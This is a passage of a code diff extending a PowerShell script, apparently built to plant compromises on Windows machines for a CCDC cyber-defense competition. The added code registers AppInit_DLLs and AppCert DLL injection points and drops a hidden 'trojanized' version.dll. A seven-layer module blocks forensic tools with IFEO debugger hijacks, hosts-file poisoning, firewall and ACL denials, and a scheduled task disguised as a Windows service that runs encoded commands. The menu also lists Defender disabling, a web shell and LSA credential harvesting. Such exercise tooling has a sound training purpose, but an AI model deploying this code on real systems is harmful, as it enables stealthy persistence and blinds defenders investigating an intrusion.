+            New-Item -Path $backupPath -Force | Out-Null
+            $appInitValue     = (Get-ItemProperty $appInitPath -ErrorAction SilentlyContinue)."AppInit_DLLs"
+            $loadAppInitValue = (Get-ItemProperty $appInitPath -ErrorAction SilentlyContinue).LoadAppInit_DLLs
+            Set-ItemProperty $backupPath -Name "AppInit_DLLs"     -Value $appInitValue     -ErrorAction SilentlyContinue
+            Set-ItemProperty $backupPath -Name "LoadAppInit_DLLs" -Value $loadAppInitValue -ErrorAction SilentlyContinue
+        }
+        $injectionDll = "$injectionDir\ccdc_hook.dll"
+        Set-ItemProperty $appInitPath -Name "AppInit_DLLs"     -Value $injectionDll
+        Set-ItemProperty $appInitPath -Name "LoadAppInit_DLLs" -Value 1
+        Write-Status "AppInit_DLLs registered: $injectionDll" 'Success'
+    } catch { Write-Status "AppInit_DLLs setup error: $_" 'Warning' }
+
+    # Step 3: AppCert DLLs
+    Write-Status "Step 3: Registering AppCert DLLs (process creation intercept)..."
+    $appCertPath = "HKLM:\System\CurrentControlSet\Control\Session Manager\AppCertDLLs"
+    try {
+        if (-not (Test-Path $appCertPath)) { New-Item -Path $appCertPath -Force | Out-Null }
+        Set-ItemProperty $appCertPath -Name "CCDC_ProcessHook" -Value "$injectionDir\ccdc_inject.dll"
+        Write-Status "AppCert DLL registered for process creation" 'Success'
+    } catch { Write-Status "AppCert DLLs setup error: $_" 'Warning' }
+
+    # Step 4: Trojanized version.dll
+    Write-Status "Step 4: Setting up DLL search order hijacking..."
+    try {
+        $trojanDll = "$injectionDir\version.dll"
+        if (-not (Test-Path $trojanDll)) {
+            Set-Content -Path $trojanDll -Value "; Trojanized version.dll marker`nCCDC_TROJANIZED_DLL"
+            (Get-Item $trojanDll).Attributes = 'Hidden'
+        }
+        Write-Status "DLL search order hijacking prepared" 'Success'
+    } catch { Write-Status "DLL search order setup error: $_" 'Warning' }
+
+    # Step 5: Hook log
+    Write-Status "Step 5: Creating hook information log..."
+    $hookLog = @"
+================================================================================
+                        CCDC DLL HOOK ACTIVITY LOG
+================================================================================
+Timestamp: $(Get-Date)
+System: $env:COMPUTERNAME
+User: $env:USERNAME
+
+REGISTRY INJECTION POINTS:
+  AppInit_DLLs     : $injectionDir\ccdc_hook.dll
+  AppCert DLLs     : $injectionDir\ccdc_inject.dll
+  Backup key       : HKLM\...\ccdc_backup
+
+HIDDEN FILES:
+  $injectionDir\*.dll
+  C:\Windows\Temp\ccdc_hook_log.txt
+
+DETECTION: dir /a:h C:\Windows\Temp\ccdc_*
+CLEANUP:   .\CCDC_Windows_DLL_HookLineAndSinker.ps1 -Cleanup
+================================================================================
+"@
+    Set-Content -Path "C:\Windows\Temp\ccdc_hook_log.txt" -Value $hookLog
+    (Get-Item "C:\Windows\Temp\ccdc_hook_log.txt").Attributes = 'Hidden'
+    Write-Status "Hook log created (hidden)" 'Success'
+
+    Write-Success "DLL Hook complete."
+    Write-Info "  AppInit_DLLs, AppCert DLLs, and trojanized version.dll planted."
+    Write-Warn "  To cleanup: .\CCDC_Windows_DLL_HookLineAndSinker.ps1 -Cleanup"
+}
+
+# =============================================================================
+# 9. SYSINTERNALS NUKER  - 7-layer block on Sysinternals tools
+# (from CCDC_Windows_SysInternals_SysInternalsNuker.ps1)
+# =============================================================================
+function Invoke-SysInternalsNuker {
+    Write-Section "9/9  - SysInternals Nuker: 7-layer block on forensic tools"
+
+    $BlockerStubPath  = "C:\Windows\System32\SysInternalsBlocked.cmd"
+    $IFEOBase         = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
+    $FirewallRuleName = "CCDC_Block_SysInternals_Outbound"
+    $WatchdogTaskName = "WindowsDiagTrackCacheRefresh"
+    $WatchdogTaskPath = "\Microsoft\Windows\WindowsUpdate\"
+
+    $TargetTools = @(
+        "procexp.exe",    "procexp64.exe",
+        "procmon.exe",    "procmon64.exe",
+        "tcpview.exe",
+        "autoruns.exe",   "autoruns64.exe",  "autorunsc.exe",
+        "handle.exe",     "handle64.exe",
+        "strings.exe",    "strings64.exe",
+        "listdlls.exe",   "listdlls64.exe",
+        "accesschk.exe",  "accesschk64.exe",
+        "procdump.exe",   "procdump64.exe",
+        "pslist.exe",
+        "bginfo.exe",
+        "sysmon.exe",     "sysmon64.exe"
+    )
+
+    $SysInternalsHosts = @("live.sysinternals.com", "download.sysinternals.com")
+
+    # -- Layer 1: IFEO ----------------------------------------------------------
+    Write-Info "Layer 1: Setting IFEO intercepts..."
+    $stub = @'
+@echo off
+cls
+echo.
+echo  BZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZT
+echo.
+pause
+exit /b 1
+'@
+    try {
+        Set-Content -Path $BlockerStubPath -Value $stub -Encoding ASCII -Force
+        Write-Success "  Blocker stub written: $BlockerStubPath"
+    } catch { Write-Err "  Could not write blocker stub: $_"; return }
+
+    foreach ($tool in $TargetTools) {
+        $regPath = "$IFEOBase\$tool"
+        try {
+            if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force -ErrorAction Stop | Out-Null }
+            Set-ItemProperty -Path $regPath -Name "Debugger" -Value $BlockerStubPath -ErrorAction Stop
+            Write-Success "  IFEO: $tool"
+        } catch { Write-Warn "  IFEO failed for $tool : $_" }
+    }
+
+    # -- Layer 2: AppLocker -----------------------------------------------------
+    Write-Info "Layer 2: Configuring AppLocker deny rules..."
+    try {
+        Set-Service -Name AppIDSvc -StartupType Automatic -ErrorAction Stop
+        Start-Service -Name AppIDSvc -ErrorAction Stop
+
+        $denyRules = foreach ($t in $TargetTools) {
+            $guid = [System.Guid]::NewGuid().ToString()
+            "    <FilePathRule Id=""$guid"" Name=""CCDC_Block_$t"" Description=""CCDC Sysinternals block"" UserOrGroupSid=""S-1-1-0"" Action=""Deny"">
+      <Conditions>
+        <FilePathCondition Path=""*\$t"" />
+      </Conditions>
+    </FilePathRule>"
+        }
+
+        $allowWin    = [System.Guid]::NewGuid().ToString()
+        $allowPF     = [System.Guid]::NewGuid().ToString()
+        $allowPFx86  = [System.Guid]::NewGuid().ToString()
+        $allowAdmins = [System.Guid]::NewGuid().ToString()
+
+        $policyXml = @"
+<AppLockerPolicy Version="1">
+  <RuleCollection Type="Exe" EnforcementMode="Enabled">
+    <FilePathRule Id="$allowAdmins" Name="Allow Administrators everything" Description="" UserOrGroupSid="S-1-5-32-544" Action="Allow">
+      <Conditions><FilePathCondition Path="*" /></Conditions>
+    </FilePathRule>
+    <FilePathRule Id="$allowWin" Name="Allow Windows" Description="" UserOrGroupSid="S-1-1-0" Action="Allow">
+      <Conditions><FilePathCondition Path="%WINDIR%\*" /></Conditions>
+    </FilePathRule>
+    <FilePathRule Id="$allowPF" Name="Allow ProgramFiles" Description="" UserOrGroupSid="S-1-1-0" Action="Allow">
+      <Conditions><FilePathCondition Path="%PROGRAMFILES%\*" /></Conditions>
+    </FilePathRule>
+    <FilePathRule Id="$allowPFx86" Name="Allow ProgramFiles x86" Description="" UserOrGroupSid="S-1-1-0" Action="Allow">
+      <Conditions><FilePathCondition Path="%PROGRAMFILES(X86)%\*" /></Conditions>
+    </FilePathRule>
+$($denyRules -join "`n")
+  </RuleCollection>
+</AppLockerPolicy>
+"@
+        $policyFile = "$env:TEMP\ccdc_applocker_combustion.xml"
+        Set-Content -Path $policyFile -Value $policyXml -Encoding UTF8 -Force
+        Set-AppLockerPolicy -XmlPolicy $policyFile -Merge -ErrorAction Stop
+        Remove-Item $policyFile -Force -ErrorAction SilentlyContinue
+        Write-Success "  AppLocker deny rules merged and AppIDSvc started"
+    } catch { Write-Warn "  AppLocker config failed (Layer 2 skipped -- IFEO still active): $_" }
+
+    # -- Layer 3: Hosts file ----------------------------------------------------
+    Write-Info "Layer 3: Poisoning hosts file for Sysinternals domains..."
+    $hostsPath = "C:\Windows\System32\drivers\etc\hosts"
+    try {
+        $hostsContent = Get-Content -Path $hostsPath -Raw -ErrorAction Stop
+        foreach ($domain in $SysInternalsHosts) {
+            if ($hostsContent -notmatch [regex]::Escape($domain)) {
+                Add-Content -Path $hostsPath -Value "`r`n127.0.0.1  $domain" -Encoding ASCII -ErrorAction Stop
+                Write-Success "  Hosts: $domain -> 127.0.0.1"
+            } else {
+                Write-Warn "  Hosts: $domain already present, skipping"
+            }
+        }
+    } catch { Write-Warn "  Hosts file update failed: $_" }
+
+    # -- Layer 4: Disable WebClient ---------------------------------------------
+    Write-Info "Layer 4: Disabling WebClient service (kills live UNC access)..."
+    try {
+        Stop-Service -Name WebClient -Force -ErrorAction SilentlyContinue
+        Set-Service  -Name WebClient -StartupType Disabled -ErrorAction Stop
+        Write-Success "  WebClient service disabled"
+    } catch { Write-Warn "  WebClient disable failed: $_" }
+
+    # -- Layer 5: Outbound firewall block ---------------------------------------
+    Write-Info "Layer 5: Adding outbound firewall block for Sysinternals domains..."
+    try {
+        Remove-NetFirewallRule -DisplayName $FirewallRuleName -ErrorAction SilentlyContinue
+        $resolvedIPs = @()
+        foreach ($domain in $SysInternalsHosts) {
+            try {
+                $ips = [System.Net.Dns]::GetHostAddresses($domain) | Select-Object -ExpandProperty IPAddressToString
+                $resolvedIPs += $ips
+            } catch {}
+        }
+        if ($resolvedIPs.Count -gt 0) {
+            New-NetFirewallRule `
+                -DisplayName  $FirewallRuleName `
+                -Direction    Outbound `
+                -Action       Block `
+                -Protocol     TCP `
+                -RemotePort   80,443 `
+                -RemoteAddress ($resolvedIPs | Sort-Object -Unique) `
+                -Description  "CCDC: block Sysinternals download endpoints" `
+                -ErrorAction Stop | Out-Null
+            Write-Success "  Firewall rule created blocking $($resolvedIPs.Count) IP(s)"
+        } else {
+            Write-Warn "  DNS returned no IPs (hosts already poisoned?) -- skipping firewall rule"
+        }
+    } catch { Write-Warn "  Firewall rule creation failed: $_" }
+
+    # -- Layer 6: NTFS deny-execute on drop paths -------------------------------
+    Write-Info "Layer 6: Denying execute on common tool drop paths..."
+    $dropPaths = [System.Collections.Generic.List[string]]@(
+        "C:\Tools", "C:\Sysinternals", "C:\SysInternals64", "C:\Windows\Temp"
+    )
+    if (Test-Path "C:\Users") {
+        foreach ($profile in (Get-ChildItem "C:\Users" -Directory -ErrorAction SilentlyContinue)) {
+            $dropPaths.Add("$($profile.FullName)\Downloads")
+            $dropPaths.Add("$($profile.FullName)\Desktop")
+            $dropPaths.Add("$($profile.FullName)\AppData\Local\Temp")
+        }
+    }
+    foreach ($path in $dropPaths) {
+        if (-not (Test-Path $path)) {
+            try { New-Item -ItemType Directory -Path $path -Force | Out-Null } catch { continue }
+        }
+        try {
+            $acl = Get-Acl -Path $path -ErrorAction Stop
+            $denyRule = New-Object System.Security.AccessControl.FileSystemAccessRule(
+                "BUILTIN\Users",
+                [System.Security.AccessControl.FileSystemRights]::ExecuteFile,
+                [System.Security.AccessControl.InheritanceFlags]"ContainerInherit,ObjectInherit",
+                [System.Security.AccessControl.PropagationFlags]::None,
+                [System.Security.AccessControl.AccessControlType]::Deny
+            )
+            $acl.AddAccessRule($denyRule)
+            Set-Acl -Path $path -AclObject $acl -ErrorAction Stop
+            Write-Success "  ACL deny-execute: $path"
+        } catch { Write-Warn "  ACL failed for $path : $_" }
+    }
+
+    # -- Layer 7: Watchdog kill task --------------------------------------------
+    Write-Info "Layer 7: Installing watchdog kill task..."
+    try {
+        $processNames = ($TargetTools |
+            ForEach-Object { [System.IO.Path]::GetFileNameWithoutExtension($_) } |
+            Sort-Object -Unique) -join "','"
+
+        $killerScript = @"
+`$targets = @('$processNames')
+foreach (`$name in `$targets) {
+    `$procs = Get-Process -Name `$name -ErrorAction SilentlyContinue
+    if (`$procs) { `$procs | Stop-Process -Force -ErrorAction SilentlyContinue }
+}
+"@
+        $encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($killerScript))
+
+        Unregister-ScheduledTask -TaskName $WatchdogTaskName -Confirm:$false -ErrorAction SilentlyContinue
+
+        $action    = New-ScheduledTaskAction -Execute "powershell.exe" `
+                         -Argument "-NonInteractive -WindowStyle Hidden -EncodedCommand $encoded"
+        $trigger   = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(10) `
+                         -RepetitionInterval (New-TimeSpan -Seconds 60) `
+                         -RepetitionDuration ([System.TimeSpan]::MaxValue)
+        $settings  = New-ScheduledTaskSettingsSet `
+                         -ExecutionTimeLimit ([System.TimeSpan]::Zero) `
+                         -MultipleInstances  IgnoreNew
+        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
+
+        Register-ScheduledTask `
+            -TaskName    $WatchdogTaskName `
+            -TaskPath    $WatchdogTaskPath `
+            -Action      $action `
+            -Trigger     $trigger `
+            -Settings    $settings `
+            -Principal   $principal `
+            -Description "Windows Diagnostic Cache Refresh Service (system managed)" `
+            -ErrorAction Stop | Out-Null
+
+        Write-Success "  Watchdog task registered: $WatchdogTaskPath$WatchdogTaskName"
+    } catch { Write-Warn "  Watchdog task failed: $_" }
+
+    Write-Success "All 7 layers deployed. Sysinternals is on fire."
+    Write-Warn "  Run .\CCDC_Windows_SysInternals_SysInternalsNuker.ps1 -Undo to restore."
+}
+
+# =============================================================================
 # MAIN  - Interactive menu or -Modules param dispatch
 # =============================================================================
 
@@ -667,6 +1528,11 @@ function Show-Menu {
     Write-Host "    [2] Web Shell         - Rogue IIS site on port 777"
     Write-Host "    [3] Scheduled Tasks   - Notepad alert + service killer every 3 min"
     Write-Host "    [4] Persistence       - 5-location startup persistence planter"
+    Write-Host "    [5] Defender Neuter   - Disable Defender, Firewall, Security Center"
+    Write-Host "    [6] Remote Access     - Misconfigure RDP, WinRM, SSH, Telnet, SNMP"
+    Write-Host "    [7] LSA Loot          - LSA SSP/CredProvider credential harvesting"
+    Write-Host "    [8] DLL Hook          - AppInit_DLLs, AppCert DLLs, search-order hijack"
+    Write-Host "    [9] SysInternals      - 7-layer block on Sysinternals forensic tools"
     Write-Host "    [A] All of the above"
     Write-Host "    [Q] Quit"
     Write-Host ""
@@ -674,14 +1540,24 @@ function Show-Menu {
 
 # Map both numbers and names to a canonical name
 $moduleMap = @{
-    '1'              = 'Users'
-    '2'              = 'WebShell'
-    '3'              = 'ScheduledTasks'
-    '4'              = 'Persistence'
-    'USERS'          = 'Users'
-    'WEBSHELL'       = 'WebShell'
-    'SCHEDULEDTASKS' = 'ScheduledTasks'
-    'PERSISTENCE'    = 'Persistence'
+    '1'               = 'Users'
+    '2'               = 'WebShell'
+    '3'               = 'ScheduledTasks'
+    '4'               = 'Persistence'
+    '5'               = 'DefenderNeuter'
+    '6'               = 'RemoteAccess'
+    '7'               = 'LSA'
+    '8'               = 'DLLHook'
+    '9'               = 'SysInternals'
+    'USERS'           = 'Users'
+    'WEBSHELL'        = 'WebShell'
+    'SCHEDULEDTASKS'  = 'ScheduledTasks'
+    'PERSISTENCE'     = 'Persistence'
+    'DEFENDERNEUTER'  = 'DefenderNeuter'
+    'REMOTEACCESS'    = 'RemoteAccess'
+    'LSA'             = 'LSA'
+    'DLLHOOK'         = 'DLLHook'
+    'SYSINTERNALS'    = 'SysInternals'
 }
 
 $selected = @()
@@ -698,7 +1574,7 @@ if ($Modules.Count -gt 0) {
     }
 
     if ($raw -eq 'A') {
-        $selected = @('1','2','3','4')
+        $selected = @('1','2','3','4','5','6','7','8','9')
     } else {
         $selected = $raw -split '[,\s]+' | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne '' }
     }
@@ -723,8 +1599,9 @@ if ($toRun.Count -eq 0) {
 Write-Host ""
 Write-Info "Modules to run: $($toRun -join ', ')"
 
-# Always execute in dependency order: Users -> WebShell -> ScheduledTasks -> Persistence
-foreach ($mod in @('Users','WebShell','ScheduledTasks','Persistence')) {
+# Always execute in dependency order
+foreach ($mod in @('Users','WebShell','ScheduledTasks','Persistence',
+                   'DefenderNeuter','RemoteAccess','LSA','DLLHook','SysInternals')) {
     if ($toRun -contains $mod) {
         try {
             switch ($mod) {
@@ -732,6 +1609,11 @@ foreach ($mod in @('Users','WebShell','ScheduledTasks','Persistence')) {
                 'WebShell'       { Invoke-RogueWebShell }
                 'ScheduledTasks' { Invoke-ScheduledTasks }
                 'Persistence'    { Invoke-PersistencePlanter }
+                'DefenderNeuter' { Invoke-DefenderNeuter }
+                'RemoteAccess'   { Invoke-RemoteAccess }
+                'LSA'            { Invoke-LSALootTheVault }
+                'DLLHook'        { Invoke-DLLHookLineAndSinker }
+                'SysInternals'   { Invoke-SysInternalsNuker }
             }
         } catch {
             Write-Err "Module '$mod' failed: $_"
